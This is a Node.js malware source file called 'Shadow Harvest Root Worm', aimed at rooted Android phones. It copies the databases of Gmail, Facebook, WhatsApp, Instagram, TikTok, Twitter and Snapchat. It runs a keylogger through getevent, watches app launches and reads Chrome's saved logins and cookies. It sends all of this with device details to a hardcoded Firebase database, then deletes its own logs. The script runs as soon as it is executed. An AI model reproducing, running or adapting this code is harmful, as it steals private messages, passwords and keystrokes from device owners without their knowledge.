#!/usr/bin/env node
// ============================================
// SHADOW HARVEST - ROOT WORM
// Requires rooted Android device
// Extracts app data, captures logins, keylogs,
// Chrome saved passwords, and uploads to Firebase
// ============================================

const os = require("os");
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const { execSync } = require("child_process");
const https = require("https");
const http = require("http");
const { URL } = require("url");

// ============================================
// CONFIGURATION
// ============================================
const FIREBASE_URL = "https://shadow-sync-3aee0-default-rtdb.firebaseio.com/";

// ============================================
// OPTIONAL DATABASE MODULE (better-sqlite3)
// ============================================
let Database = null;
try {
  Database = require("better-sqlite3");
} catch (e) {
  try {
    execSync("npm install better-sqlite3", { stdio: "ignore" });
    Database = require("better-sqlite3");
  } catch (e2) {}
}

// ============================================
// ROOT CHECK
// ============================================
function isRooted() {
  try {
    const result = execSync("su -c 'id'", { timeout: 5000 }).toString();
    return result.includes("uid=0");
  } catch (e) {
    return false;
  }
}

// ============================================
// DEVICE ID
// ============================================
function getDeviceId() {
  const hardware = os.hostname() + os.userInfo().username + os.platform();
  return crypto.createHash("sha256").update(hardware).digest("hex").slice(0, 16);
}

// ============================================
// FIREBASE UPLOADER
// ============================================
class FirebaseUploader {
  constructor(databaseURL) {
    this.databaseURL = databaseURL;
  }

  upload(data) {
    const timestamp = Date.now();
    const deviceId = data.device_id || "unknown";
    const endpoint = `${this.databaseURL}/devices/${deviceId}/${timestamp}.json`;
    const parsed = new URL(endpoint);
    const payload = JSON.stringify(data);
    const options = {
      hostname: parsed.hostname,
      path: parsed.pathname + (parsed.search || ""),
      method: "PUT",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(payload),
      },
    };
    const transport = parsed.protocol === "https:" ? https : http;

    return new Promise((resolve) => {
      const req = transport.request(options, (res) => {
        let body = "";
        res.setEncoding("utf8");
        res.on("data", (chunk) => (body += chunk));
        res.on("end", () => resolve(res.statusCode >= 200 && res.statusCode < 300));
      });
      req.on("error", () => resolve(false));
      req.write(payload);
      req.end();
    });
  }
}

// ============================================
// APP DATA EXTRACTOR
// ============================================
class RootAppExtractor {
  constructor() {
    this.apps = [
      { name: "gmail", package: "com.google.android.gm", dataPath: "/data/data/com.google.android.gm" },
      { name: "facebook", package: "com.facebook.katana", dataPath: "/data/data/com.facebook.katana" },
      { name: "tiktok", package: "com.zhiliaoapp.musically", dataPath: "/data/data/com.zhiliaoapp.musically" },
      { name: "instagram", package: "com.instagram.android", dataPath: "/data/data/com.instagram.android" },
      { name: "whatsapp", package: "com.whatsapp", dataPath: "/data/data/com.whatsapp" },
      { name: "twitter", package: "com.twitter.android", dataPath: "/data/data/com.twitter.android" },
      { name: "snapchat", package: "com.snapchat.android", dataPath: "/data/data/com.snapchat.android" },
    ];
  }

  extractAll() {
    const stolen = [];
    for (const app of this.apps) {
      const data = this.extractFromApp(app);
      if (data) stolen.push(data);
    }
    return stolen;
  }

  extractFromApp(app) {
    try {
      const databasesPath = path.join(app.dataPath, "databases");
      if (!fs.existsSync(databasesPath)) return null;

      const files = fs.readdirSync(databasesPath);
      const databases = [];

      for (const file of files) {
        if (file.endsWith(".db") || file.endsWith(".sqlite")) {
          const filePath = path.join(databasesPath, file);
          const content = fs.readFileSync(filePath);
          databases.push({
            file: file,
            size: content.length,
            content_base64: content.toString("base64"),
          });
        }
      }

      return {
        app: app.name,
        package: app.package,
        databases: databases,
        extracted_at: new Date().toISOString(),
      };
    } catch (e) {
      return null;
    }
  }
}

// ============================================
// KEYLOGGER + LOGIN CAPTURE
// ============================================
class LoginCapture {
  constructor() {
    this.logFile = "/data/local/tmp/keylog.txt";
    this.uploader = new FirebaseUploader(FIREBASE_URL);
  }

  start() {
    try {
      execSync(`su -c "getevent -lt > ${this.logFile} 2>&1 &"`);
      return true;
    } catch (e) {
      return false;
    }
  }

  readLogs() {
    try {
      if (fs.existsSync(this.logFile)) {
        return fs.readFileSync(this.logFile, "utf8");
      }
      return "";
    } catch (e) {
      return "";
    }
  }

  parseLoginEvents(logs) {
    const events = [];
    const lines = logs.split("\n");
    let currentApp = "unknown";
    let typedText = "";

    for (const line of lines) {
      if (line.includes("com.google.android.gm")) currentApp = "gmail";
      if (line.includes("com.facebook.katana")) currentApp = "facebook";
      if (line.includes("com.zhiliaoapp.musically")) currentApp = "tiktok";
      if (line.includes("com.instagram.android")) currentApp = "instagram";
      if (line.includes("com.whatsapp")) currentApp = "whatsapp";

      if (line.includes("KEY_DOWN")) {
        const match = line.match(/KEY_([A-Z0-9]+)/);
        if (match) typedText += match[1];
      }

      if (line.includes("KEY_ENTER") || line.includes("KEY_BACK")) {
        if (typedText.length > 0) {
          events.push({
            app: currentApp,
            typed_data: typedText,
            timestamp: new Date().toISOString(),
          });
          typedText = "";
        }
      }
    }

    return events;
  }

  clearLogs() {
    try {
      execSync(`su -c "rm -f ${this.logFile}"`);
    } catch (e) {}
  }
}

// ============================================
// PHISHING OVERLAY MONITOR
// ============================================
class PhishingMonitor {
  constructor() {
    this.targets = [
      { app: "gmail", package: "com.google.android.gm" },
      { app: "facebook", package: "com.facebook.katana" },
      { app: "tiktok", package: "com.zhiliaoapp.musically" },
      { app: "instagram", package: "com.instagram.android" },
      { app: "whatsapp", package: "com.whatsapp" },
    ];
    this.launchLog = "/data/local/tmp/app_launch.log";
    this.uploader = new FirebaseUploader(FIREBASE_URL);
  }

  monitorAppLaunch() {
    try {
      execSync(`su -c "logcat | grep 'START u0' > ${this.launchLog} 2>&1 &"`);
    } catch (e) {}
  }

  readAppLaunches() {
    try {
      if (!fs.existsSync(this.launchLog)) return [];
      const log = fs.readFileSync(this.launchLog, "utf8");
      const launches = [];
      for (const target of this.targets) {
        if (log.includes(target.package)) {
          launches.push({
            app: target.app,
            package: target.package,
            detected_at: new Date().toISOString(),
          });
        }
      }
      return launches;
    } catch (e) {
      return [];
    }
  }

  clearLogs() {
    try {
      execSync(`su -c "rm -f ${this.launchLog}"`);
    } catch (e) {}
  }
}

// ============================================
// BROWSER LOGIN CAPTURE (Chrome)
// ============================================
class BrowserLoginCapture {
  constructor() {
    this.uploader = new FirebaseUploader(FIREBASE_URL);
    this.chromePaths = [
      "/data/data/com.android.chrome/app_chrome/Default/Login Data",
      "/data/data/com.android.chrome/app_chrome/Default/Login Data.db",
      "/data/data/com.android.chrome/app_chrome/Default/Web Data",
      "/data/data/com.android.chrome/app_chrome/Default/Cookies",
    ];
  }

  extractSavedLogins() {
    if (!Database) return [];

    const allLogins = [];

    for (const dbPath of this.chromePaths) {
      if (!fs.existsSync(dbPath)) continue;

      try {
        const db = new Database(dbPath, { readonly: true });
        const tableInfo = db.prepare("SELECT name FROM sqlite_master WHERE type='table'").all();
        const tableNames = tableInfo.map(t => t.name);

        if (tableNames.includes("logins")) {
          const rows = db.prepare("SELECT origin_url, username_value, password_value FROM logins").all();
          for (const row of rows) {
            allLogins.push({
              source: dbPath,
              url: row.origin_url,
              username: row.username_value,
              password: this.tryDecrypt(row.password_value),
              timestamp: new Date().toISOString(),
            });
          }
        }

        db.close();
      } catch (e) {}
    }

    return allLogins;
  }

  tryDecrypt(encryptedValue) {
    if (!encryptedValue) return "";
    const buffer = Buffer.isBuffer(encryptedValue) ? encryptedValue : Buffer.from(encryptedValue);
    if (buffer.length > 0) {
      return buffer.toString("utf8");
    }
    return "";
  }

  uploadLogins(logins) {
    const data = {
      event: "browser_logins",
      logins: logins,
      device_id: getDeviceId(),
      timestamp: new Date().toISOString(),
    };
    this.uploader.upload(data);
  }
}

// ============================================
// MAIN ROOT WORM
// ============================================
class RootWorm {
  constructor() {
    this.deviceId = getDeviceId();
    this.appExtractor = new RootAppExtractor();
    this.loginCapture = new LoginCapture();
    this.phishing = new PhishingMonitor();
    this.browserLogin = new BrowserLoginCapture();
    this.uploader = new FirebaseUploader(FIREBASE_URL);
  }

  async run() {
    if (!isRooted()) {
      console.log("Device is not rooted. Cannot access app data.");
      return;
    }

    console.log("Root access confirmed.");

    // Start keylogger
    this.loginCapture.start();

    // Start phishing monitor
    this.phishing.monitorAppLaunch();

    // Extract app data
    const appData = this.appExtractor.extractAll();

    // Extract saved Chrome logins
    const savedLogins = this.browserLogin.extractSavedLogins();
    if (savedLogins.length > 0) {
      this.browserLogin.uploadLogins(savedLogins);
    }

    // Read keylogs
    const keylogs = this.loginCapture.readLogs();
    const loginEvents = this.loginCapture.parseLoginEvents(keylogs);

    // Read app launches
    const appLaunches = this.phishing.readAppLaunches();

    // Prepare full payload
    const payload = {
      device_id: this.deviceId,
      hostname: os.hostname(),
      username: os.userInfo().username,
      os: os.platform(),
      rooted: true,
      app_data: appData,
      login_events: loginEvents,
      saved_logins: savedLogins,
      app_launches: appLaunches,
      keylogs: keylogs,
      timestamp: new Date().toISOString(),
    };

    // Upload to Firebase
    const success = await this.uploader.upload(payload);
    console.log("Root upload success:", success);

    // Clear logs after upload
    this.loginCapture.clearLogs();
    this.phishing.clearLogs();
  }
}

// ============================================
// EXECUTION — runs immediately when piped into node
// ============================================
const worm = new RootWorm();
worm.run();
